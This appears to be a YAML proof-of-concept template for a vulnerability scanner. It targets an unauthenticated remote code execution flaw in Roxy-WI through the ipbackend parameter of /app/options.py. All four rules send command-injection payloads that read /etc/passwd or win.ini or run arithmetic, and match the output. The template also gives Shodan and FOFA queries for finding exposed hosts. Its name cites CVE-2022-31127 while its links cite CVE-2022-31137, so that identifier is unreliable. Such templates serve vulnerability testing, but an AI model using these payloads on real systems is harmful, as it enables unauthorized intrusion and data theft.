name: poc-yaml-roxy-wi-cve-2022-31127-rce
binding: f7fa7a8d-6622-4eb2-b3ed-1053a7e239fd
manual: true
detail:
    author: 10cker(https://github.com/10cker)
    links:
        - https://www.cve.org/CVERecord?id=CVE-2022-31137
        - https://github.com/hap-wi/roxy-wi/security/advisories/GHSA-53r2-mq99-f532
        - https://pentest.blog/advisory-roxy-wi-unauthenticated-remote-code-executions-cve-2022-31137/
    vulnerability:
        id: CT-454488
        level: critical
    description: |
        Roxy-WI <6.1.1.0 - Unauthenticated Remote Code Execution via subprocess_execute
    metadata:
        fofa-query: app="HAProxy-WI"
        shodan-query: http.html:"Roxy-WI"
        verified: "true"
transport: http
set:
    s1: randomInt(100000, 200000)
    s2: randomInt(10000, 20000)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /app/options.py
            headers:
                Content-Type: application/x-www-form-urlencoded; charset=UTF-8
                X-Requested-With: XMLHttpRequest
            body: alert_consumer=1&serv=127.0.0.1&ipbackend=%22%3Bcat+/etc/passwd+%23%23&backend_server=127.0.0.1
        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
    r1:
        request:
            cache: true
            method: POST
            path: /app/options.py
            headers:
                Content-Type: application/x-www-form-urlencoded; charset=UTF-8
                X-Requested-With: XMLHttpRequest
            body: alert_consumer=1&serv=127.0.0.1&ipbackend=%22%3Bset+/A+{{s1}}-{{s2}}+%23%23&backend_server=127.0.0.1
        expression: response.status == 200 && response.body.bcontains(bytes(string(s1 - s2)))
    r2:
        request:
            cache: true
            method: POST
            path: /app/options.py
            headers:
                Content-Type: application/x-www-form-urlencoded; charset=UTF-8
                X-Requested-With: XMLHttpRequest
            body: alert_consumer=1&serv=127.0.0.1&ipbackend=%22%3Btype+c:/windows/win.ini+%23%23&backend_server=127.0.0.1
        expression: response.status == 200 && response.body.bcontains(b"for 16-bit app support")
    r3:
        request:
            cache: true
            method: POST
            path: /app/options.py
            headers:
                Content-Type: application/x-www-form-urlencoded; charset=UTF-8
                X-Requested-With: XMLHttpRequest
            body: alert_consumer=1&serv=127.0.0.1&ipbackend=%22%3Bexpr+{{s1}}+-+{{s2}}+%23%23&backend_server=127.0.0.1
        expression: response.status == 200 && response.body.bcontains(bytes(string(s1 - s2)))
expression: r0() || r1() || r2() || r3()
